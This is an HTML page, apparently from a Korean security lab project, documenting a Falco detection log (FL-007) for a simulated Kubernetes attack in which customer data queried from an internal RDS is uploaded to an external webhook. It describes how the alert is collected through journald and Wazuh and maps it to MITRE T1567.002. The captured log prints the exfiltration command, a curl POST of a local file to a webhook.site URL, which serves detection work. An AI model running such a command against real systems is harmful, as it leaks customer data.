@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SB-04 FL-007 Falco HTTP Data Upload | Spacebar Campaign Logs</title>
+  <link rel="stylesheet" href="/assets/campaign.css">
+</head>
+<body>
+  <header class="topbar">
+    <div class="topbar-inner">
+      <a class="brand" href="/campaigns/"><img class="brand-logo" src="/assets/spacebarLogo.png" alt="Spacebar"><span>Spacebar Campaigns</span></a>
+    </div>
+  </header>
+
+  <div class="page-shell">
+
+    <aside class="campaign-sidebar" aria-label="Campaign log navigation">
+      <div class="sidebar-block">
+        <div class="sidebar-title">SB-04 Logs</div>
+        <nav class="sidebar-links">
+          <a class="sidebar-link" href="/campaigns/SB-04/">Campaign Page</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/">Campaign Logs</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-001/"><span>FL-001</span>Falco RCE Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-RECON/"><span>FL-RECON</span>Falco Credential Recon Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-002/"><span>FL-002</span>Falco RBAC Check Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-003/"><span>FL-003</span>Falco Copy Fail Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/KL-001/"><span>KL-001</span>Kyverno Suspicious Pod Creation Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-004/"><span>FL-004</span>Falco Host Namespace Entry Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/AL-001/"><span>AL-001</span>CloudTrail GetCallerIdentity Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-005/"><span>FL-005</span>Falco IMDS Credential Access</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/AL-002/"><span>AL-002</span>CloudTrail Secrets/RDS Discovery Log</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-006/"><span>FL-006</span>Falco DB Client Access</a>
+          <a class="sidebar-link active" href="/campaigns/SB-04/logs/FL-007/"><span>FL-007</span>Falco HTTP Data Upload</a>
+        </nav>
+      </div>
+      <div class="sidebar-block">
+        <div class="sidebar-title">Global Catalog</div>
+        <nav class="sidebar-links">
+          <a class="sidebar-link" href="/logs/">All Logs</a>
+        </nav>
+      </div>
+    </aside>
+    <main class="page campaign-content">
+      <div class="breadcrumbs"><a href="/campaigns/">Home</a> / <a href="/campaigns/SB-04/">NodeFall</a> / <a href="/campaigns/SB-04/logs/">Campaign Logs</a> / <span>FL-007</span></div>
+<h1>FL-007 Falco HTTP Data Upload</h1>
+<div class="meta-grid" aria-label="Campaign metadata">
+<div class="meta-label">Log ID:</div>
+<div class="meta-value">FL-007</div>
+<div class="meta-label">Source:</div>
+<div class="meta-value">SB-04 K8s Node</div>
+<div class="meta-label">Representative Path:</div>
+<div class="meta-value"><code>journalctl -u falco-modern-bpf.service</code></div>
+<div class="meta-label">Collection:</div>
+<div class="meta-value">Wazuh agent journald input</div>
+<div class="meta-label">Primary Use:</div>
+<div class="meta-value">내부 RDS에서 조회한 고객 데이터가 외부 webhook 수신지로 전송되었는지 확인</div>
+</div>
+<h2 id="공격-행위-요약">공격 행위 요약</h2>
+<p>FL-007은 공격자가 내부 RDS에서 조회한 고객 데이터를 파일로 저장한 뒤, 컨테이너 내부에서 <code>curl</code>을 실행해 외부 HTTPS 수신지로 업로드한 행위를 설명하는 Falco 런타임 로그이다.</p>
+<p>공격자는 MySQL 조회 결과를 <code>/tmp/customer_orders.txt</code> 파일로 저장하고, <code>curl -X POST --data-binary</code> 명령으로 해당 파일을 <code>webhook.site</code> 주소에 전송했다.</p>
+<p>Falco에서 <code>cmd</code>, <code>parent_cmd</code>, <code>pod</code>, <code>ns</code>, <code>container_id</code>가 함께 확인되므로, 해당 데이터 업로드 행위가 <code>kube-system</code> 네임스페이스의 <code>pwned-pod-final</code> 컨테이너 실행 환경에서 발생했음을 판단할 수 있다.</p>
+<h2 id="로그-발생-위치">로그 발생 위치</h2>
+<div class="table-wrap wide-table">
+<table>
+<thead><tr><th>구분</th><th>위치</th><th>설명</th></tr></thead>
+<tbody>
+<tr><td>K8s Node</td><td>Falco</td><td>HTTP 업로드 명령 실행 이벤트 탐지</td></tr>
+<tr><td>journald</td><td><code>falco-modern-bpf.service</code></td><td>Falco 탐지 로그 저장</td></tr>
+<tr><td>Wazuh</td><td>Wazuh Dashboard</td><td>수집된 Falco alert 확인</td></tr>
+</tbody></table></div>
+<h2 id="수집-방식">수집 방식</h2>
+<div class="table-wrap wide-table">
+<table>
+<thead><tr><th>구분</th><th>방식</th></tr></thead>
+<tbody>
+<tr><td>Falco 탐지 기준</td><td><code>curl</code>을 이용한 외부 HTTP/HTTPS 업로드 명령 실행 여부 확인</td></tr>
+<tr><td>Falco 탐지 메시지</td><td>조건 매칭 시 <code>[FL-007] HTTP Data Upload</code> 로그 생성</td></tr>
+<tr><td>Linux syscall</td><td><code>execve</code>, <code>execveat</code> 이벤트가 Falco에 전달</td></tr>
+<tr><td>journald</td><td>Falco 이벤트가 <code>falco-modern-bpf.service</code> 로그에 저장</td></tr>
+<tr><td>Wazuh agent</td><td>K8s node에서 journald 로그 수집</td></tr>
+<tr><td>Wazuh manager</td><td>수집된 Falco 로그를 <code>FL-007</code> 룰과 매칭</td></tr>
+<tr><td>Wazuh Dashboard</td><td><code>[FL-007] HTTP Data Upload</code> 이벤트로 표시</td></tr>
+</tbody></table></div>
+<h2 id="로그-출력-명령어">로그 출력 명령어</h2>
+<pre><code>sudo journalctl -u falco-modern-bpf.service --no-pager | grep -E &quot;\[FL-007\] HTTP Data Upload&quot;</code></pre>
+<h2 id="실제-관측-로그">실제 관측 로그</h2>
+<pre><code>May 27 10:38:08 ip-10-0-133-48 falco[531]:
+  10:38:08.768787987: Critical [FL-007] HTTP Data Upload
+  (
+    technique=T1567.002
+    cmd=&quot;curl -X POST --data-binary @/tmp/customer_orders.txt https://webhook.site/1607b201-4617-4cd9-aaeb-97baa2da222a&quot;
+    parent_cmd=&quot;bash -i&quot;
+    user=root
+    pod=pwned-pod-final
+    ns=kube-system
+    container_id=d501b505262b
+  )
+  container_id=d501b505262b
+  container_name=pwned
+  container_image_repository=docker.io/library/node
+  container_image_tag=20
+  k8s_pod_name=pwned-pod-final
+  k8s_ns_name=kube-system</code></pre>
+<h2 id="주요-필드">주요 필드</h2>
+<div class="table-wrap wide-table">
+<table>
+<thead><tr><th>필드</th><th>의미</th><th>예시</th></tr></thead>
+<tbody>
+<tr><td><code>cmd</code></td><td>실행된 외부 업로드 명령</td><td><code>curl -X POST --data-binary @/tmp/customer_orders.txt ...</code></td></tr>
+<tr><td><code>pod</code></td><td>명령이 실행된 Pod</td><td><code>pwned-pod-final</code></td></tr>
+<tr><td><code>ns</code></td><td>Pod 네임스페이스</td><td><code>kube-system</code></td></tr>
+<tr><td><code>container_id</code></td><td>명령이 실행된 컨테이너 ID</td><td><code>d501b505262b</code></td></tr>
+</tbody></table></div>
+<h2 id="커버-대상-techniques-used">커버 대상 Techniques Used</h2>
+<div class="table-wrap wide-table">
+<table>
+<thead><tr><th>Primary Log</th><th>Technique</th><th>Mapping Reason</th></tr></thead>
+<tbody>
+<tr><td>FL-007</td><td>T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage</td><td><code>curl</code>을 이용해 내부 DB 조회 결과 파일을 외부 webhook 수신지로 업로드한 행위를 설명한다.</td></tr>
+</tbody></table></div>
+<h2 id="탐지-포인트">탐지 포인트</h2>
+<div class="table-wrap wide-table">
+<table>
+<thead><tr><th>Technique</th><th>관찰 행위</th><th>주요 필드</th></tr></thead>
+<tbody>
+<tr><td>T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage</td><td>컨테이너 내부에서 <code>curl</code> 명령이 실행되었는지 확인한다.</td><td><code>cmd</code></td></tr>
+<tr><td>T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage</td><td><code>--data-binary</code> 옵션으로 로컬 파일 업로드가 수행되었는지 확인한다.</td><td><code>cmd</code></td></tr>
+<tr><td>T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage</td><td>업로드 대상이 외부 webhook 수신지인지 확인한다.</td><td><code>cmd</code></td></tr>
+<tr><td>T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage</td><td>해당 명령이 <code>pwned-pod-final</code> 컨테이너에서 실행되었는지 확인한다.</td><td><code>pod</code>, <code>ns</code>, <code>container_id</code></td></tr>
+</tbody></table></div>
+      <footer class="footer">
+        Spacebar Project. This campaign log page is scoped to SB-04.
+      </footer>
+    </main>
+  </div>
+</body>
+</html>
